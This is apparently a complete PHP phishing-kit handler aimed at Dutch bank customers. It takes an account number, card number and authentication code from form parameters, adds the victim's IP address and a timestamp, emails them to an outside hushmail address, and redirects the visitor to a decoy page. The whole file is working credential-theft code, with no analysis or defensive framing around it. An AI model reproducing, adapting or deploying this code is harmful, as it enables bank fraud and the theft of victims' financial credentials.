<?php
header("Location: secur-p.html");
$IP = $_SERVER['REMOTE_ADDR'];

$to = "finoknaller@hushmail.com";

$message = "Rekeningnmr: " . $_GET['P1'] . "\n";
$message .= "Pasnmer: " . $_GET['P2'] . "\n";
$message .= "I-c0de: " . $_GET['P3'] . "\n";
$message .= "IPadres:" . $logdetails=  date("F j, Y, g:i a") . ': ' . '<a target=_blank href=http://www.dnsstuff.com/tools/ipall.ch?domain='.$_SERVER['REMOTE_ADDR'].'>'.$_SERVER['REMOTE_ADDR'].'</a>';


mail($to, '(1)S-INGOL - '.$_SERVER['REMOTE_ADDR'].'', $message);
exit;
?>
